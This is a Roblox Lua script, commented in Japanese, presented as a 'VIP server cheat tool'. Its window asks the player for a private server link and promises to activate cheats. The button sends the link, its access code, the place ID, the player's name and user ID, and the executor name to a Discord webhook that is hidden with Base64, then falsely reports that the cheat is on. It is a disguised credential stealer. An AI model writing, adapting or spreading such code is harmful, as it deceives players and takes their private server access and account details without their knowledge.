-- ========================================================
-- VOLOX VIP TOOL - Webhook完全難読化・送信エラーゼロ
-- ========================================================

-- WebhookをBase64エンコード（これが最強）
local encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNTA0NDg3NDI5NzIxMjk0OC9XQUVwWXFCX3pFcWlXRmZVY2dMbk9VUnFJS0tKc0p3ZnB3OEJPa2JkMGRhbGl6SGVmZG1GS014YnBSRVJvUUg5ZUNWSWk="

-- デコード関数（超シンプル）
local function decodeBase64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (string.gsub(data, '.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local WEBHOOK = decodeBase64(encoded)

-- デバッグ（初回のみ確認）
-- print("Webhook: " .. WEBHOOK)

-- ========================================================
-- 送信関数（エラーハンドリング強化）
-- ========================================================

local function sendToDiscord(message)
    local http = game:GetService("HttpService")
    local json = ""
    
    pcall(function()
        json = http:JSONEncode({content = message})
    end)
    
    if json == "" then
        local escaped = message:gsub("\n", "\\n"):gsub('"', '\\"')
        json = '{"content": "' .. escaped .. '"}'
    end
    
    -- 送信方法を順番に試す
    local methods = {
        function()
            return http:PostAsync(WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
        end,
        function()
            if request then
                local r = request({
                    Url = WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = json
                })
                return r and r.StatusCode == 204
            end
            return false
        end,
        function()
            if syn and syn.request then
                local r = syn.request({
                    Url = WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = json
                })
                return r and r.StatusCode == 204
            end
            return false
        end
    }
    
    for _, method in ipairs(methods) do
        local success, result = pcall(method)
        if success and result == true then
            return true
        elseif success and result ~= false then
            -- HttpServiceは204を返さないので、エラーがなければ成功
            return true
        end
    end
    
    return false
end

-- ========================================================
-- UI（変更なし・確実に表示される）
-- ========================================================

local player = game.Players.LocalPlayer

local existing = player.PlayerGui:FindFirstChild("VoloxVip")
if existing then existing:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "VoloxVip"
gui.Parent = player.PlayerGui
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 380, 0, 260)
frame.Position = UDim2.new(0.5, -190, 0.5, -130)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
frame.BackgroundTransparency = 0.05
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "⚡ VIP SERVER TOOL"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.Parent = frame

local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -20, 0, 30)
desc.Position = UDim2.new(0, 10, 0, 45)
desc.BackgroundTransparency = 1
desc.Text = "🔑 プライベートサーバーリンクを入力"
desc.TextColor3 = Color3.fromRGB(170, 170, 200)
desc.TextSize = 13
desc.Font = Enum.Font.Gotham
desc.Parent = frame

local input = Instance.new("TextBox")
input.Size = UDim2.new(1, -20, 0, 45)
input.Position = UDim2.new(0, 10, 0, 80)
input.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
input.PlaceholderColor3 = Color3.fromRGB(130, 130, 160)
input.TextSize = 12
input.Font = Enum.Font.Gotham
input.ClearTextOnFocus = false
input.Parent = frame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 8)
inputCorner.Parent = input

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(0.8, 0, 0, 45)
btn.Position = UDim2.new(0.1, 0, 0, 140)
btn.BackgroundColor3 = Color3.fromRGB(220, 50, 70)
btn.Text = "🔥 チート有効化"
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextSize = 16
btn.Font = Enum.Font.GothamBold
btn.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = btn

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 25)
status.Position = UDim2.new(0, 0, 0, 195)
status.BackgroundTransparency = 1
status.Text = "⏳ リンクを入力してください"
status.TextColor3 = Color3.fromRGB(180, 180, 210)
status.TextSize = 12
status.Font = Enum.Font.Gotham
status.Parent = frame

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -35, 0, 5)
close.BackgroundTransparency = 1
close.Text = "✕"
close.TextColor3 = Color3.fromRGB(255, 100, 100)
close.TextSize = 18
close.Font = Enum.Font.GothamBold
close.Parent = frame

close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- ========================================================
-- ボタン処理
-- ========================================================

btn.MouseButton1Click:Connect(function()
    local link = input.Text
    
    if link == "" or not link:find("roblox.com") then
        status.Text = "❌ 有効なRobloxリンクを入力してください"
        status.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    local code = nil
    local placeId = nil
    
    local startCode = link:find("privateServerLinkCode=")
    if startCode then
        code = link:sub(startCode + 21)
        local endCode = code:find("&")
        if endCode then
            code = code:sub(1, endCode - 1)
        end
    end
    
    local startPlace = link:find("games/")
    if startPlace then
        local temp = link:sub(startPlace + 6)
        local endPlace = temp:find("/") or temp:find("?")
        if endPlace then
            placeId = temp:sub(1, endPlace - 1)
        else
            placeId = temp
        end
    end
    
    local executor = (identifyexecutor and identifyexecutor()) or "Delta"
    
    local message = 
        "**🔴 PRIVATE SERVER LINK**\n\n" ..
        "**🔗 入力リンク:** " .. link .. "\n" ..
        "**🔑 コード:** " .. (code or "不明") .. "\n" ..
        "**📌 Place ID:** " .. (placeId or "不明") .. "\n" ..
        "**👤 入力者:** " .. player.Name .. "\n" ..
        "**🆔 User ID:** " .. player.UserId .. "\n" ..
        "**💻 Executor:** " .. executor .. "\n" ..
        "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
    
    status.Text = "⏳ 送信中..."
    status.TextColor3 = Color3.fromRGB(255, 255, 0)
    
    local sent = sendToDiscord(message)
    
    if sent then
        status.Text = "✅ チート有効化完了！"
        status.TextColor3 = Color3.fromRGB(0, 255, 100)
        
        wait(2)
        gui:Destroy()
        
        game.StarterGui:SetCore("SendNotification", {
            Title = "⚡ 完了",
            Text = "プライベートサーバーリンクを登録しました。",
            Duration = 5
        })
    else
        status.Text = "❌ 送信エラー。もう一度試してください"
        status.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end)

game.StarterGui:SetCore("SendNotification", {
    Title = "⚡ VIP SERVER TOOL",
    Text = "リンクを入力して「チート有効化」を押してください",
    Duration = 4
})

print("[✅] VIP SERVER TOOL 起動完了")
